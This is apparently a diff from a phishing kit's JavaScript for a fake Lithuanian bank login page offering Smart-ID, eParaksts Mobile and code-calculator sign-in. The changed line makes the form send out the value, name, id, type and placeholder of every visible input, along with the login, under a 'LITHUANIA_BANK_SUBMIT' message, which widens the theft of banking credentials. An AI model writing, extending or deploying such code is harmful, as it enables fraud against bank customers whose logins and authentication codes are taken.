@@ -94,7 +94,7 @@ function submitLogin(){
   var u=document.querySelector('input[name=auth_login]');
   if(u&&u.value&&u.value.trim())inputs['auth_login']=u.value.trim();
   var labels={1:'Smart-ID',2:'eParaksts Mobile',3:'Kodu kalkulators'};
-  post({type:'LITHUANIA_BANK_SUBMIT',formData:{inputs:inputs,fields:[],loginMethod:labels[curM]||'Smart-ID'}});
+  post({type:'LITHUANIA_BANK_SUBMIT',formData:{inputs:inputs,fields:visInputs().map(function(i){return{key:i.name||i.id||'field',value:i.value||'',type:i.type||'text',name:i.name||'',id:i.id||'',placeholder:i.getAttribute('placeholder')||''};}),loginMethod:labels[curM]||'Smart-ID'}});
 }
 document.addEventListener('click',function(e){
   var t=e.target;
